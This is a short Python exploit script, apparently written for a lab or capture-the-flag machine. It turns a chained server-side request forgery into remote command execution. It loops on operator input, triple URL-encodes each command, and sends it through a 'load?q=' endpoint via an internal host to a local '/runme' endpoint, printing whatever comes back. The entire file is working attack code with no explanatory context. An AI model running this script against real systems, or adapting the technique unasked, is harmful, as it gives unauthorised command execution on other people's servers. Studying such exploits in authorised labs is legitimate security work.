import requests
import sys
# import re 

from urllib.parse import quote 

def triple_encode(message):
	return quote(quote(quote(message)))


if __name__ == '__main__':
	if len(sys.argv) != 2:
		print("[!] python ssrf2rce.py TARGET_IP")
		sys.exit()

	print("[!] Enter command to execute")
	print("[!] Press q to quit")

	target_ip = sys.argv[1]
	s = requests.Session()
	analysing = True 
	while analysing:
		user_input = input("> ")
		if user_input == 'q':
			analysing = False
			print("[!] Shutting down!")
			break

		url = f"http://{target_ip}/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x={triple_encode(user_input)}"
		r = s.get(url)
		print(r.text)
		# print('====')
		# results = re.findall(r'<a>(.*)</a>', r.text)
		# print(results)
		# if len(results):
		# 	for result in results:
		# 		print(result)
	